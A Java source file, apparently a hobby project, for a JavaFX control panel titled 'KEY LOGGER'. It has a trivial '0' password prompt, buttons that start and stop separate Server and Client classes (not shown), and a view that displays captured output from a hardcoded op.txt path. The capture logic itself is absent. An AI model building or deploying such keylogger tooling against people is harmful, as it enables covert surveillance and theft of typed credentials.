import javafx.application.Application;
import javafx.event.ActionEvent;
import javafx.event.EventHandler;
import javafx.geometry.Pos;
import javafx.scene.control.TextArea;
import javafx.scene.text.Text;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.layout.GridPane;
import javafx.stage.Stage;
import javafx.scene.paint.Color;
import javax.swing.*;
import java.io.File;
import java.io.FileNotFoundException;
import java.util.Scanner;


public class Front extends Application {
/*
    // START
    // Starting from Server.class

    public static final CountDownLatch latch = new CountDownLatch(1);
    public static Front starts = null;

    public static Front waitforfront() {
        try {
            latch.await();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        return starts;
    }

    public static void setStart(Front startUp) {
        starts = startUp;
        latch.countDown();
    }

    public Front() {
        setStart(this);
    }

    public void notif() {
        System.out.println("You called a method on the application");
    }

    // END
*/


    public static void main(String[] args) {
        launch(args);
    }

    @Override
    public void start(Stage primaryStage) throws Exception {

        GridPane root = new GridPane();
        GridPane root1 = new GridPane();
        GridPane output = new GridPane();
        Button btn = new Button("Enter Password");
        Button rbtn = new Button("Start");
        Button rbtn1 = new Button("Output");
        Button exit = new Button("Exit");
        TextArea ta1 = new TextArea();
        Text t1 = new Text("                                                OUTPUT PREVIEW (also available in op.txt)");

        rbtn.setStyle(
                "-fx-background-radius: 5em; " +
                        "-fx-min-width: 90px; " +
                        "-fx-min-height: 90px; " +
                        "-fx-max-width: 90px; " +
                        "-fx-max-height: 90px;"
        );
        rbtn1.setStyle(
                "-fx-background-radius: 5em; " +
                        "-fx-min-width: 90px; " +
                        "-fx-min-height: 90px; " +
                        "-fx-max-width: 90px; " +
                        "-fx-max-height: 90px;"
        );
        exit.setTextFill(Color.RED);
        ta1.setEditable(false);

        Server s = new Server();
        Client c = new Client();

        Scene scene = new Scene(root, 1500, 800);
        Scene scene1 = new Scene(root1, 1500, 800);
        Scene scene2 = new Scene(output, 1500, 800);
        root.setHgap(25);
        root.setVgap(50);
        root1.setHgap(25);
        root1.setVgap(50);
        output.setHgap(15);
        output.setVgap(50);
        root.add(btn, 27, 7);
        root1.add(rbtn, 30, 3);
        root1.add(rbtn1, 30, 5);
        output.add(t1, 30, 4);
        output.add(ta1, 30, 5);
        output.add(exit, 34, 8);
        rbtn1.setDisable(true);
        primaryStage.setScene(scene);
        primaryStage.setTitle("KEY LOGGER");
        primaryStage.show();

        btn.setOnAction(new EventHandler<ActionEvent>() {

            @Override
            public void handle(ActionEvent arg0) {
                int i = 0;
                while (i < 3) {
                    i++;
                    String input = JOptionPane.showInputDialog(null, "ENTER PASSWORD: ", "SECURED ENTRY", JOptionPane.INFORMATION_MESSAGE);
                    if (input.equals("0")) {
                        primaryStage.setScene(scene1);
                        break;
                    } else {
                        JOptionPane.showMessageDialog(null, "WRONG PASSWORD....TRY AGAIN " + (3 - i) + " CHANCES LEFT", "OOPS", JOptionPane.ERROR_MESSAGE);
                    }
                    if (i == 3) {
                        System.exit(0);
                    }
                }

            }
        });

        rbtn.setOnAction(new EventHandler<ActionEvent>() {

            @Override
            public void handle(ActionEvent arg0) {
                System.out.println("Starting server & client");
                s.start();
                c.start();
                rbtn.setDisable(true);
                rbtn1.setDisable(false);
            }
        });

        rbtn1.setOnAction(new EventHandler<ActionEvent>() {

            @Override
            public void handle(ActionEvent arg0) {

                System.out.println("Stopping");
                s.flag();
                primaryStage.setScene(scene2);

                File file = new File("C://Users//91932//Desktop//timepass//java//Keylogger//op.txt");
                try {
                    String contents = new Scanner(file).useDelimiter("\\Z").next();
                    ta1.appendText(contents);
                } catch (FileNotFoundException e) {
                    e.printStackTrace();
                }

            }
        });

        exit.setOnAction(new EventHandler<ActionEvent>() {

            @Override
            public void handle(ActionEvent arg0) {

                System.exit(0);

            }
        });


    }

}

/*
with exit button
 */